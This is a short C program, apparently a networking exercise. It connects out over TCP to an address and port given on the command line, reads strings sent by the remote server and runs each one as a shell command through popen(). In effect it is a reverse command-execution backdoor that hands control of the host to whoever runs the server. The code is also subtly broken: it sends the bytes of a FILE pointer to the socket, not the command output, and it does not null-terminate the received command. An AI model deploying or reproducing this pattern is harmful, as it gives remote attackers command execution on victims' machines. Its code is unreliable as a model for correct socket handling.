#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define MAXLINE 4096

int main(int argc, char **argv)
{
    int sockfd, n, link[2];
    pid_t pid;
    char recvline[MAXLINE + 1];
    char error[MAXLINE + 1];
    char message[MAXLINE + 1];
    char output[MAXLINE + 1];
    struct sockaddr_in servaddr;
    socklen_t servaddr_len;

    if (argc != 3)
    {
        strcpy(error, "uso: ");
        strcat(error, argv[0]);
        strcat(error, " <IPaddress> <Port>");
        perror(error);
        exit(1);
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket error");
        exit(1);
    }

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(argv[2]));
    if (inet_pton(AF_INET, argv[1], &servaddr.sin_addr) <= 0)
    {
        perror("inet_pton error");
        exit(1);
    }

    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        perror("connect error");
        exit(1);
    }

    servaddr_len = sizeof(servaddr);
    if (getsockname(sockfd, (struct sockaddr *)&servaddr, &servaddr_len) < 0)
    {
        perror("getsockname error");
        exit(1);
    }
    printf("Local socket is %s:%d\n", inet_ntoa(servaddr.sin_addr), ntohs(servaddr.sin_port));

    while ((n = read(sockfd, recvline, MAXLINE)) > 0)
    {
        recvline[n] = 0;
        if (fputs(recvline, stdout) == EOF)
        {
            perror("fputs error");
            exit(1);
        }

        read(sockfd, message, sizeof(message));

        // INIT EXECUTE COMMAND
        FILE *fp;
        char path[1035];

        /* Open the command for reading. */
        fp = popen(message, "r");
        if (fp == NULL)
        {
            printf("Failed to run command\n");
            exit(1);
        }

        write(sockfd, fp, sizeof(fp));

        /* Read the output a line at a time - output it. */
        while (fgets(path, sizeof(path), fp) != NULL)
        {
            printf("%s", path);
        }


        /* close */
        pclose(fp);
        // END EXECUTE COMMAND
    }

    if (n < 0)
    {
        close(sockfd);
    }

    exit(0);
}
